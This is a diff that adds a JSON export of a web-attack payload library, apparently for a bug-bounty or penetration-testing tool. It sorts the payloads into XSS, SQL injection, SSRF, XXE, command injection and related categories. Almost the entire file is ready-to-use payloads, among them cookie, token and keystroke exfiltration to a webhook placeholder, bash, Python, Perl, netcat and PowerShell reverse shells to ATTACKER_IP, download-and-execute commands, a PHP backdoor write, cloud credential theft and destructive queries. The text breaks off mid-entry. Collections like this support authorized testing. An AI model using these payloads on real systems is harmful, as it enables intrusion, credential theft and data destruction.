@@ -1,0 +1,928 @@
+{
+  "version": "1.0",
+  "exportDate": "2026-02-11T16:54:02.892Z",
+  "categories": [
+    {
+      "name": "XSS",
+      "description": "Cross-Site Scripting payloads including modern WAF bypasses and exfiltration techniques",
+      "color": "#e60000",
+      "order": 0
+    },
+    {
+      "name": "SQL Injection",
+      "description": "SQL Injection payloads for various database types and injection contexts",
+      "color": "#ff6b35",
+      "order": 1
+    },
+    {
+      "name": "SSRF",
+      "description": "Server-Side Request Forgery payloads targeting cloud metadata and internal networks",
+      "color": "#f7931e",
+      "order": 2
+    },
+    {
+      "name": "XXE",
+      "description": "XML External Entity payloads for file disclosure and out-of-band exfiltration",
+      "color": "#fccc0a",
+      "order": 3
+    },
+    {
+      "name": "Command Injection",
+      "description": "OS Command Injection payloads with exfiltration and reverse shell capabilities",
+      "color": "#8ac926",
+      "order": 4
+    },
+    {
+      "name": "Path Traversal",
+      "description": "Directory traversal payloads with encoding and filter bypass techniques",
+      "color": "#1982c4",
+      "order": 5
+    },
+    {
+      "name": "SSTI",
+      "description": "Server-Side Template Injection payloads for various template engines",
+      "color": "#6a4c93",
+      "order": 6
+    },
+    {
+      "name": "IDOR",
+      "description": "Insecure Direct Object Reference patterns for authorization bypass",
+      "color": "#bc4749",
+      "order": 7
+    }
+  ],
+  "payloads": [
+    {
+      "name": "Modern WAF Bypass - SVG Onload",
+      "content": "<svg/onload=alert(1)>",
+      "description": "Minimal SVG-based XSS that bypasses many WAF filters by using self-closing tags. Works on WAFs that don't properly parse SVG tags.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"waf-bypass\",\"svg\",\"reflected\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Cloudflare WAF Bypass - Decimal Encoding",
+      "content": "<svg onload=prompt&#0000000040document.domain)>",
+      "description": "Uses 8+ superfluous leading zeros in decimal encoding to bypass Cloudflare's character encoding checks. Source: HackerOne Report #1615743",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"cloudflare\",\"waf-bypass\",\"encoding\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Blind XSS with Webhook Exfiltration",
+      "content": "<script>fetch('{{WEBHOOK_URL}}',{method:'POST',mode:'no-cors',body:document.cookie+'\\n'+document.domain+'\\n'+window.location.href})</script>",
+      "description": "Exfiltrates cookies, domain, and current URL to attacker webhook for blind XSS detection. Use with XSS Hunter or custom webhook services.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"blind-xss\",\"exfiltration\",\"webhook\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "DOM-Based XSS - localStorage Theft",
+      "content": "<script>document.location='{{WEBHOOK_URL}}?token='+localStorage.getItem('access_token')+'&refresh='+localStorage.getItem('refresh_token')</script>",
+      "description": "Steals JWT tokens or API keys stored in localStorage. Particularly effective against SPA applications.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"dom-based\",\"token-theft\",\"jwt\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Keylogger XSS Payload",
+      "content": "<img src=x onerror='document.onkeypress=function(e){fetch(\"{{WEBHOOK_URL}}?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+      "description": "Captures all keystrokes and sends them to attacker webhook. Demonstrates high impact for bug bounty reports.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"keylogger\",\"exfiltration\",\"advanced\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Double Encoded Non-Printable Characters",
+      "content": "%2527%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E",
+      "description": "Double URL encoding breaks many WAF filters that only decode once. Source: Starbucks HackerOne Report #716761",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"waf-bypass\",\"encoding\",\"double-encoded\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "AngularJS Template Injection",
+      "content": "{{constructor.constructor('alert(1)')()}}",
+      "description": "Bypasses AngularJS sandbox in versions <1.6. Still relevant for legacy Angular applications.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"angular\",\"template-injection\",\"framework\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Prototype Pollution to XSS",
+      "content": "https://example.com/#__proto__[innerHTML]=<img src=x onerror=alert(1)>",
+      "description": "Exploits prototype pollution vulnerability to inject XSS via object properties. Works on applications vulnerable to prototype pollution.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"prototype-pollution\",\"javascript\",\"dom-based\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Script Gadget with DOMPurify Bypass",
+      "content": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+      "description": "Bypasses DOMPurify sanitization using mXSS mutation. Source: Research from Cure53",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"dompurify\",\"bypass\",\"mxss\",\"mutation\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Mutation XSS - Backslash Newline",
+      "content": "<style><\\x3Cimg src=x onerror=alert(1)></style>",
+      "description": "Uses backslash-newline to create mutations that bypass sanitizers. Effective against innerHTML-based sanitization.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"mxss\",\"mutation\",\"bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "CSP Bypass - JSONP Endpoint",
+      "content": "<script src=\"https://trusted-domain.com/jsonp?callback=alert\"></script>",
+      "description": "Bypasses Content Security Policy by leveraging trusted domain's JSONP endpoint. Find JSONP on whitelisted domains.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"csp-bypass\",\"jsonp\",\"trusted-domain\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Service Worker XSS Persistence",
+      "content": "<script>navigator.serviceWorker.register('{{WEBHOOK_URL}}/sw.js')</script>",
+      "description": "Registers malicious service worker for persistent XSS. Service worker intercepts all page requests even after refresh.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"service-worker\",\"persistence\",\"advanced\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Unicode Normalization XSS",
+      "content": "<img src=x onerror=\\u0061lert(1)>",
+      "description": "Uses Unicode escape sequences to bypass filters. Some WAFs normalize Unicode differently than browsers.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"unicode\",\"normalization\",\"bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "HTML Injection to XSS via Meta Refresh",
+      "content": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+      "description": "Escalates HTML injection to XSS using meta refresh redirect. Works when script tags are blocked.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"html-injection\",\"meta-refresh\",\"escalation\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XSS via SVG ForeignObject",
+      "content": "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
+      "description": "Embeds HTML inside SVG via foreignObject element. Bypasses filters that allow SVG but block HTML script tags.",
+      "categoryName": "XSS",
+      "tags": "[\"xss\",\"svg\",\"foreignobject\",\"bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Time-Based Blind SQLi - MySQL",
+      "content": "admin' AND SLEEP(5)-- -",
+      "description": "Forces 5-second delay if condition is true, confirming SQL injection. Increase sleep time for unreliable networks.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"blind\",\"time-based\",\"mysql\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Boolean-Based Blind SQLi",
+      "content": "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- -",
+      "description": "Returns different responses based on condition truth, enabling data extraction. Works across multiple database types.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"blind\",\"boolean\",\"logic\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "UNION-Based SQLi with NULL Probing",
+      "content": "' UNION SELECT NULL,NULL,NULL,NULL,username,password,NULL FROM users-- -",
+      "description": "Extracts user credentials by matching column count and positions. Adjust NULL count to match original query columns.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"union\",\"credential-theft\",\"mysql\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Out-of-Band SQLi with Webhook",
+      "content": "'; EXEC xp_dirtree '{{WEBHOOK_URL}}'+@@version+'/'-- -",
+      "description": "MSSQL payload that exfiltrates database version via DNS/HTTP to webhook. Requires xp_dirtree to be enabled.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"oob\",\"mssql\",\"exfiltration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "PostgreSQL Error-Based SQLi",
+      "content": "' AND 1=CAST((SELECT version()) as numeric)-- -",
+      "description": "Forces error message containing database version in response. Replace version() with any query for data extraction.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"error-based\",\"postgresql\",\"enumeration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "MySQL Load File with UNC Path",
+      "content": "' UNION SELECT LOAD_FILE('\\\\\\\\{{WEBHOOK_DOMAIN}}\\\\a')-- -",
+      "description": "Forces MySQL to make SMB connection to attacker server, exfiltrating NTLM hashes. Only works on Windows MySQL installations.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"mysql\",\"ntlm\",\"exfiltration\",\"windows\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Time-Based Blind - MSSQL",
+      "content": "'; IF (SELECT SYSTEM_USER)='sa' WAITFOR DELAY '00:00:05'-- -",
+      "description": "Conditional 5-second delay reveals if current user is 'sa' (admin). Modify user check to enumerate permissions.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"mssql\",\"blind\",\"privilege-check\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SQLi Polyglot Payload",
+      "content": "SLEEP(1) /*' or SLEEP(1) or \"' or SLEEP(1) or \"*/",
+      "description": "Works across multiple injection contexts (single quote, double quote, no quote). Source: PayloadsAllTheThings",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"polyglot\",\"universal\",\"time-based\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Stacked Queries - PostgreSQL",
+      "content": "'; DROP TABLE users;--",
+      "description": "Executes multiple SQL statements in one query. PostgreSQL and MSSQL support stacked queries by default.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"stacked-queries\",\"postgresql\",\"destructive\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "NoSQL Injection - MongoDB",
+      "content": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "description": "Bypasses authentication in MongoDB by using $ne (not equal) operator. Returns first user where both fields exist.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"nosql\",\"mongodb\",\"authentication-bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SQLi in ORDER BY Clause",
+      "content": "?sort=id; WAITFOR DELAY '00:00:05'--",
+      "description": "Exploits SQL injection in ORDER BY parameter. Many developers don't sanitize sort parameters.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"order-by\",\"blind\",\"time-based\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SQLMap Tamper Script Bypass",
+      "content": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -",
+      "description": "Character-by-character extraction using ASCII comparison. Automatable with SQLMap's --technique=B flag.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"blind\",\"ascii\",\"extraction\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "WAF Bypass - Comment Injection",
+      "content": "1' /*!50000AND*/ 1=1-- -",
+      "description": "Uses MySQL version-specific comments to bypass WAF keyword filtering. /*!50000*/ executes only on MySQL 5.0+",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"waf-bypass\",\"mysql\",\"comment-injection\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Second Order SQLi Payload",
+      "content": "admin'-- (stored) → Triggers on: SELECT * FROM users WHERE username='admin'--'",
+      "description": "Malicious payload stored in database, triggered later in different query. Hard to detect with automated scanners.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"second-order\",\"stored\",\"advanced\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SQLi via HTTP Headers",
+      "content": "X-Forwarded-For: 127.0.0.1' OR '1'='1",
+      "description": "Exploits SQL injection in HTTP header processing (X-Forwarded-For, User-Agent, Referer). Often overlooked in security testing.",
+      "categoryName": "SQL Injection",
+      "tags": "[\"sqli\",\"http-headers\",\"x-forwarded-for\",\"injection-point\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "AWS EC2 Metadata Extraction (IMDSv1)",
+      "content": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "description": "Retrieves AWS IAM credentials from EC2 instance metadata service. Note: IMDSv2 requires token-based authentication.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"aws\",\"cloud\",\"credential-theft\",\"imds\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "AWS IMDSv2 Token-Based Access",
+      "content": "PUT http://169.254.169.254/latest/api/token\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nThen: GET /latest/meta-data/iam/security-credentials/\nX-aws-ec2-metadata-token: <token>",
+      "description": "Bypasses IMDSv2 protection by first obtaining session token. Many applications don't properly restrict PUT methods.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"aws\",\"imdsv2\",\"advanced\",\"cloud\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "GCP Metadata with Header Bypass",
+      "content": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "description": "Retrieves GCP OAuth token. Requires 'Metadata-Flavor: Google' header - often forgotten in WAF rules.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"gcp\",\"cloud\",\"token-theft\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Azure Instance Metadata Service",
+      "content": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "description": "Extracts Azure VM metadata including managed identity tokens. Requires api-version parameter and 'Metadata: true' header.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"azure\",\"cloud\",\"microsoft\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "DNS Exfiltration via SSRF",
+      "content": "http://{{DATA}}.{{WEBHOOK_DOMAIN}}/",
+      "description": "Exfiltrates data through DNS subdomain in attacker-controlled domain. Works even when HTTP responses are not returned.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"exfiltration\",\"dns\",\"blind\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Internal Network Port Scanning",
+      "content": "http://192.168.1.1:22\nhttp://192.168.1.1:80\nhttp://192.168.1.1:3306\nhttp://192.168.1.1:6379",
+      "description": "Scans internal network for common services via SSRF. Response timing differences reveal open ports.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"recon\",\"network-scanning\",\"internal\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SSRF via Webhook Feature",
+      "content": "{\"webhook_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
+      "description": "Exploits webhook registration endpoints to trigger SSRF. Source: HackerOne Report #508459 - Omise",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"webhook\",\"cloud-metadata\",\"aws\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Localhost Bypass with IPv6",
+      "content": "http://[::]:80/admin\nhttp://[0000::1]:8080/internal",
+      "description": "Bypasses localhost blacklists using IPv6 notation. Many filters only check IPv4 addresses.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"bypass\",\"ipv6\",\"localhost\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SSRF via PDF Generator",
+      "content": "<html><iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe></html>",
+      "description": "Exploits HTML-to-PDF conversion to trigger SSRF. PDF generators often fetch external resources without validation.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"pdf\",\"html-injection\",\"cloud-metadata\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Redis Exploitation via SSRF",
+      "content": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
+      "description": "Uses Gopher protocol to send Redis commands via SSRF. Can write webshell or create SSH keys. Requires Gopher support.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"gopher\",\"redis\",\"rce\",\"protocol-smuggling\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SSRF to RCE via Memcached",
+      "content": "gopher://127.0.0.1:11211/_set%20payload%200%200%20100%0d%0a<?php%20system($_GET['cmd']);?>%0d%0a",
+      "description": "Writes PHP backdoor to Memcached via SSRF, then accesses via application cache mechanism.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"memcached\",\"gopher\",\"rce\",\"cache-poisoning\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Blind SSRF with Time Delay",
+      "content": "http://internal-server.local:80/?sleep=10",
+      "description": "Detects blind SSRF by observing response time differences. Useful when no response content is returned.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"blind\",\"time-based\",\"detection\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Kubernetes Service Account Token Theft",
+      "content": "http://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
+      "description": "Accesses Kubernetes API from within cluster to steal service account tokens. Works from pods with network access.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"kubernetes\",\"k8s\",\"token-theft\",\"cloud-native\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SSRF via SVG Image Processing",
+      "content": "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://169.254.169.254/latest/meta-data/\" /></svg>",
+      "description": "Triggers SSRF via SVG image href attribute. Image processing libraries often fetch external resources.",
+      "categoryName": "SSRF",
+      "tags": "[\"ssrf\",\"svg\",\"image-processing\",\"cloud-metadata\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Basic XXE File Disclosure",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>",
+      "description": "Reads /etc/passwd file and includes content in XML response. Works when XML parser has external entities enabled.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"file-disclosure\",\"linux\",\"classic\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Blind XXE with OOB Exfiltration",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{WEBHOOK_URL}}/xxe.dtd\">%xxe;]><foo></foo>",
+      "description": "Two-stage blind XXE that exfiltrates files via external DTD. Host xxe.dtd with: <!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://{{WEBHOOK_URL}}/?data=%file;'>\">%eval;%exfil;",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"blind\",\"oob\",\"advanced\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE to SSRF (AWS Metadata)",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
+      "description": "Leverages XXE to perform SSRF and steal AWS credentials. Combines two vulnerability types for higher impact.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"ssrf\",\"aws\",\"cloud\",\"credential-theft\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE with PHP Wrapper",
+      "content": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+      "description": "Uses PHP wrapper to base64-encode file content, bypassing XML parsing issues. Prevents XML parser errors from binary files.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"php\",\"file-disclosure\",\"encoding\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE Billion Laughs DoS",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">]><lolz>&lol4;</lolz>",
+      "description": "Exponential entity expansion causes memory exhaustion and DoS. Source: PortSwigger Web Security Academy",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"dos\",\"denial-of-service\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE via SVG Upload",
+      "content": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>",
+      "description": "Exploits XXE through SVG file upload. SVG files are XML-based and often processed without proper sanitization.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"svg\",\"file-upload\",\"file-disclosure\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE in SOAP Request",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
+      "description": "Targets SOAP web services which are XML-based. Legacy SOAP services often have XXE vulnerabilities.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"soap\",\"web-service\",\"legacy\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE via Microsoft Office Document",
+      "content": "[Content_Types].xml:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{{WEBHOOK_URL}}/exfil\">]><Types>&xxe;</Types>",
+      "description": "Embeds XXE payload in Office document (docx, xlsx). Triggers when document is processed server-side.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"office\",\"docx\",\"document-upload\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Blind XXE via Error Messages",
+      "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]><foo/>",
+      "description": "Exfiltrates file content through XML parser error messages. Works when DTD is processed inline.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"blind\",\"error-based\",\"exfiltration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE via XInclude",
+      "content": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+      "description": "Uses XInclude to read files when you can't modify DOCTYPE. Works in XML fragments or when DOCTYPE is not user-controlled.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"xinclude\",\"file-disclosure\",\"bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE Parameter Entity Injection",
+      "content": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{WEBHOOK_URL}}/evil.dtd\">%xxe;]><foo/>",
+      "description": "Uses parameter entities for blind XXE attacks. More reliable than regular entities in some parsers.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"parameter-entity\",\"blind\",\"oob\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "XXE via XLSX Formula Injection",
+      "content": "In Excel cell: =WEBSERVICE(\"http://{{WEBHOOK_URL}}/?data=\"&A1)",
+      "description": "Combines XXE with Excel formula injection. When XLSX is parsed server-side, external requests are made.",
+      "categoryName": "XXE",
+      "tags": "[\"xxe\",\"xlsx\",\"formula-injection\",\"excel\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Linux Command Chaining with Exfiltration",
+      "content": "; curl {{WEBHOOK_URL}}?data=$(whoami | base64) ;",
+      "description": "Executes whoami command and exfiltrates base64-encoded result to webhook. Base64 encoding prevents special characters from breaking URL.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"linux\",\"exfiltration\",\"webhook\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Reverse Shell - Bash",
+      "content": "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 ;",
+      "description": "Creates interactive reverse shell connection to attacker. Replace ATTACKER_IP with your listener IP. Set up listener: nc -lvnp 4444",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"reverse-shell\",\"bash\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Blind Command Injection with DNS",
+      "content": "; nslookup $(whoami).{{WEBHOOK_DOMAIN}} ;",
+      "description": "Exfiltrates command output via DNS subdomain query. Works even when HTTP output is blocked.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"blind\",\"dns\",\"exfiltration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Time-Based Blind Command Injection",
+      "content": "; sleep 10 ;",
+      "description": "Causes 10-second delay to confirm command execution. Simplest way to detect blind command injection.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"blind\",\"time-based\",\"detection\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Windows PowerShell Download & Execute",
+      "content": "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{{WEBHOOK_URL}}/payload.ps1')\" &",
+      "description": "Downloads and executes PowerShell payload from attacker server. Common bypass for Windows restrictions.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"windows\",\"powershell\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Filter Bypass with Variable Expansion",
+      "content": "; c${IFS}url${IFS}{{WEBHOOK_URL}} ;",
+      "description": "Uses $IFS (Internal Field Separator) to bypass space filtering. $IFS expands to space/tab/newline.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"bypass\",\"linux\",\"filter-evasion\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Command Injection in JSON API",
+      "content": "{\"filename\": \"test; curl {{WEBHOOK_URL}}?data=$(cat /etc/passwd | base64) ;\"}",
+      "description": "Exploits command injection in JSON parameter processing. Common in file processing APIs.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"json\",\"api\",\"exfiltration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Python Reverse Shell",
+      "content": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ;",
+      "description": "Python-based reverse shell, useful when bash is not available. Works on systems with Python 2 or 3.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"python\",\"reverse-shell\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Command Injection with Output Redirection",
+      "content": "; cat /etc/passwd > /var/www/html/passwd.txt ;",
+      "description": "Redirects sensitive file to web-accessible directory. Access via http://target/passwd.txt",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"output-redirection\",\"file-disclosure\",\"linux\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Netcat Reverse Shell",
+      "content": "; nc ATTACKER_IP 4444 -e /bin/bash ;",
+      "description": "Uses netcat for reverse shell. Traditional nc syntax, may not work on newer nc versions without -e flag.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"netcat\",\"reverse-shell\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Command Injection via User-Agent",
+      "content": "User-Agent: () { :; }; curl {{WEBHOOK_URL}}?vuln=shellshock",
+      "description": "Exploits Shellshock vulnerability (CVE-2014-6271) via User-Agent header. Still found in legacy CGI applications.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"shellshock\",\"user-agent\",\"cve-2014-6271\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Perl Reverse Shell",
+      "content": "; perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ;",
+      "description": "Perl-based reverse shell, useful when Python and Bash are restricted. Works on most Unix systems.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"perl\",\"reverse-shell\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Command Injection with Backticks",
+      "content": "`curl {{WEBHOOK_URL}}?data=$(uname -a | base64)`",
+      "description": "Uses backticks for command substitution. Alternative to $() syntax, works in older shells.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"backticks\",\"exfiltration\",\"legacy\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Windows CMD Reverse Shell",
+      "content": "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() &",
